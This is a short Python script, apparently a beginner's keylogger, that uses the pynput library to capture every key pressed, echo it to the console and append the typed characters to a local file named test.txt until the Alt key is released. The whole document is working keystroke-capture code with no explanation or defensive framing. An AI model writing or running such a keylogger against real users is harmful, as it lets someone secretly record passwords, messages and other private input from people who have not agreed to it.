import pynput
from pynput.keyboard import Key,Listener

keys = []
count = 0

def on_press(key):
    global keys,count
    print("{0} pressed".format(key))
    keys.append(key)
    count = count + 1
    if count > 5:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("test.txt","a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
              f.write(" ")
            elif k.find("Key") == -1:
              f.write(k)

def on_release(key):
    if key == Key.alt:
        return False

with Listener(on_press = on_press , on_release=on_release) as listener:
    listener.join()


